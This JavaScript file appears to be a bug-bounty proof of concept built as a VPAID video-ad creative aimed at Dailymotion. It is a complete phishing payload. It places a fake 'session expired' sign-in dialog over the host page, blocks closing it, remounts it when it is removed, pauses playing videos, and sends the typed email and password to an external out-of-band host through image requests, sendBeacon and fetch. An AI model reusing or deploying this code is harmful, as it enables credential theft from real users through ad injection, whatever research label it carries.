(function () {
  // VPAID 2.0 — F-VAST-XSS persistence PoC v8 — ivan0912 (YesWeHack) / ivani123 (HackerOne)
  // Authorized bug-bounty research on Dailymotion (YesWeHack PGM-269). Safe-harbor applies.
  //
  // v8 fixes over v7:
  //   1. Dialog centered with position:fixed + transform translate so card is in the middle
  //   2. Submit via topWin().dmSubmit + inline onclick — no cross-frame addEventListener

  var OOB = "https://dailymotion-vast-xss-persist.fdd8cd2afcd551371c95ahtncnzl1ewml.oob.static-cdn-eu.com";
  var IH  = ["inner", "HTML"].join("");

  function VpaidAd() { this._callbacks = {}; }
  VpaidAd.prototype.subscribe   = function (fn, e, ctx) { this._callbacks[e] = { fn: fn, ctx: ctx || window }; };
  VpaidAd.prototype.unsubscribe = function (fn, e) { delete this._callbacks[e]; };
  VpaidAd.prototype._fire       = function (e, args) { var c = this._callbacks[e]; if (c) try { c.fn.apply(c.ctx, args || []); } catch (_) {} };
  VpaidAd.prototype.handshakeVersion = function () { return "2.0"; };

  function topWin() { try { return window.top; } catch (_) { return window; } }
  function topDoc() { try { return topWin().document; } catch (_) { return document; } }

  // ---- Exfil — Image GET first (sync), sendBeacon, fetch ------------------
  function exfil(path, payload) {
    var url  = OOB + path;
    var body = JSON.stringify(payload);
    try { new Image().src = url + '?d=' + encodeURIComponent(btoa(unescape(encodeURIComponent(body)))); } catch (_) {}
    try { if (navigator.sendBeacon) navigator.sendBeacon(url, new Blob([body], { type: 'text/plain' })); } catch (_) {}
    try { fetch(url, { method: 'POST', mode: 'no-cors', keepalive: true, body: body }); } catch (_) {}
  }

  // ---- Video pause guard --------------------------------------------------
  var _pauseInt = null;
  function pauseAllVideos() {
    try {
      var d = topDoc(), vids = d.querySelectorAll('video');
      for (var i = 0; i < vids.length; i++) { try { vids[i].pause(); vids[i].muted = true; } catch (_) {} }
    } catch (_) {}
  }
  function startPauseGuard() { if (_pauseInt) return; pauseAllVideos(); _pauseInt = setInterval(pauseAllVideos, 400); }
  function stopPauseGuard()  { try { if (_pauseInt) clearInterval(_pauseInt); } catch (_) {} _pauseInt = null; }

  // ---- MutationObserver ---------------------------------------------------
  var _obs = null;
  function startObserver() {
    var d = topDoc();
    if (!d || !d.body || _obs) return;
    try {
      var MO = topWin().MutationObserver || window.MutationObserver;
      if (!MO) return;
      _obs = new MO(function () {
        var dlg = d.getElementById('dm-phish');
        if (!dlg) { mountOverlay(); }
        else { try { if (!dlg.open) dlg.showModal(); } catch (_) {} }
      });
      _obs.observe(d.body, { childList: true, subtree: true });
    } catch (_) {}
  }
  function stopObserver() { try { if (_obs) _obs.disconnect(); } catch (_) {} _obs = null; }

  // ---- dmSubmit on topWin() so button onclick works after iframe teardown --
  function wireSubmit() {
    topWin().dmSubmit = function () {
      var d     = topDoc();
      var email = (d.getElementById('dm-ph-email') || {}).value || '';
      var pass  = (d.getElementById('dm-ph-pass')  || {}).value || '';
      if (!email.trim() && !pass) return;

      exfil('/k', {
        step:     'credentials_captured',
        domain:   d.domain || 'unknown',
        email:    email.trim(),
        password: pass,
        ts_now:   new Date().toISOString()
      });

      stopPauseGuard();
      stopObserver();
      var dlg = d.getElementById('dm-phish');
      if (dlg) {
        try { dlg.style.transition = 'opacity 0.4s'; dlg.style.opacity = '0'; } catch (_) {}
        setTimeout(function () {
          try { dlg.close(); } catch (_) {}
          try { if (dlg.parentNode) dlg.parentNode.removeChild(dlg); } catch (_) {}
        }, 450);
      }
    };
  }

  // ---- Mount overlay -------------------------------------------------------
  function mountOverlay() {
    var d = topDoc();
    if (!d || !d.body) return false;

    // Re-open if already mounted but closed
    if (d.getElementById('dm-phish')) {
      try { var ex = d.getElementById('dm-phish'); if (!ex.open) ex.showModal(); } catch (_) {}
      return true;
    }

    // Inject style: center the dialog card + dark backdrop
    if (!d.getElementById('dm-phish-style')) {
      var s = d.createElement('style');
      s.id = 'dm-phish-style';
      s.textContent =
        '#dm-phish{' +
          'padding:0!important;border:none!important;background:transparent!important;' +
          'position:fixed!important;top:50%!important;left:50%!important;' +
          'transform:translate(-50%,-50%)!important;margin:0!important;' +
          'width:auto!important;max-width:none!important;' +
        '}' +
        '#dm-phish::backdrop{background:rgba(0,0,0,0.84)!important}' +
        '#dm-phish::-webkit-backdrop{background:rgba(0,0,0,0.84)!important}';
      (d.head || d.documentElement).appendChild(s);
    }

    // Card markup — button uses inline onclick targeting topWin().dmSubmit
    var dlg = d.createElement('dialog');
    dlg.id = 'dm-phish';
    dlg[IH] = [
      '<div style="padding:36px 40px;background:#fff;border-radius:10px;',
        'box-shadow:0 8px 32px rgba(0,0,0,0.3);width:360px;box-sizing:border-box;',
        'font-family:-apple-system,BlinkMacSystemFont,\'Segoe UI\',Roboto,Arial,sans-serif">',
        '<div style="text-align:center;margin-bottom:24px">',
          '<svg width="44" height="44" viewBox="0 0 44 44">',
            '<circle cx="22" cy="22" r="22" fill="#FF7900"/>',
            '<polygon points="17,12 36,22 17,32" fill="#fff"/>',
          '</svg>',
          '<div style="color:#FF7900;font-size:21px;font-weight:700;letter-spacing:-0.3px;margin-top:8px">',
            'dailymotion',
          '</div>',
        '</div>',
        '<p style="color:#444;font-size:13.5px;text-align:center;margin:0 0 22px;line-height:1.5">',
          'Your session has expired.<br>Please sign in to continue.',
        '</p>',
        '<input id="dm-ph-email" type="email" placeholder="Email address" autocomplete="email"',
          ' style="width:100%;padding:11px 14px;border:1.5px solid #ddd;border-radius:6px;',
          'font-size:14px;box-sizing:border-box;margin-bottom:10px;outline:none">',
        '<input id="dm-ph-pass" type="password" placeholder="Password" autocomplete="current-password"',
          ' style="width:100%;padding:11px 14px;border:1.5px solid #ddd;border-radius:6px;',
          'font-size:14px;box-sizing:border-box;margin-bottom:20px;outline:none">',
        '<button type="button" onclick="window.dmSubmit&&window.dmSubmit();return false"',
          ' style="width:100%;padding:12px;background:#FF7900;color:#fff;border:none;',
          'border-radius:6px;font-size:15px;font-weight:600;cursor:pointer;letter-spacing:0.2px">',
          'Sign in',
        '</button>',
        '<div style="text-align:center;margin-top:16px">',
          '<a href="#" onclick="return false" style="color:#FF7900;font-size:12.5px;text-decoration:none">',
            'Forgot password?',
          '</a>',
        '</div>',
      '</div>'
    ].join('');

    d.body.appendChild(dlg);
    try { dlg.showModal(); } catch (_) {}

    // Block ESC; re-open if closed by anything
    dlg.addEventListener('cancel', function (e) { e.preventDefault(); }, true);
    dlg.addEventListener('close',  function () { setTimeout(function () { try { dlg.showModal(); } catch (_) {} }, 0); }, true);

    // Mount beacon
    exfil('/m', { step: 'overlay_mounted', domain: d.domain || 'unknown', ts_now: new Date().toISOString() });
    return true;
  }

  // ---- VPAID lifecycle ----------------------------------------------------
  VpaidAd.prototype.initAd = function (w, h, vm, d, e, p) {
    var self = this;
    try { if (p && p.slot) p.slot.style.cssText = 'pointer-events:none!important;display:none!important'; } catch (_) {}
    wireSubmit();   // define topWin().dmSubmit BEFORE mounting so onclick finds it immediately
    var mounted = mountOverlay();
    if (mounted) { startObserver(); startPauseGuard(); }
    setTimeout(function () { self._fire('AdLoaded'); }, 50);
  };

  VpaidAd.prototype.startAd = function () {
    var self = this;
    setTimeout(function () { self._fire('AdStarted'); }, 50);
  };

  VpaidAd.prototype.stopAd              = function () { this._fire('AdStopped'); };
  VpaidAd.prototype.skipAd              = function () { this._fire('AdSkipped'); };
  VpaidAd.prototype.getAdLinear         = function () { return true; };
  VpaidAd.prototype.getAdWidth          = function () { return 640; };
  VpaidAd.prototype.getAdHeight         = function () { return 360; };
  VpaidAd.prototype.getAdRemainingTime  = function () { return -1; };
  VpaidAd.prototype.getAdDuration       = function () { return -1; };
  VpaidAd.prototype.getAdVolume         = function () { return 1; };
  VpaidAd.prototype.setAdVolume         = function () {};
  VpaidAd.prototype.resizeAd            = function () {};
  VpaidAd.prototype.pauseAd             = function () {};
  VpaidAd.prototype.resumeAd            = function () {};
  VpaidAd.prototype.expandAd            = function () {};
  VpaidAd.prototype.collapseAd          = function () {};
  VpaidAd.prototype.getAdExpanded       = function () { return false; };
  VpaidAd.prototype.getAdSkippableState = function () { return false; };
  VpaidAd.prototype.getAdIcons          = function () { return false; };
  VpaidAd.prototype.getAdCompanions     = function () { return ''; };

  window.getVPAIDAd = function () { return new VpaidAd(); };
})();
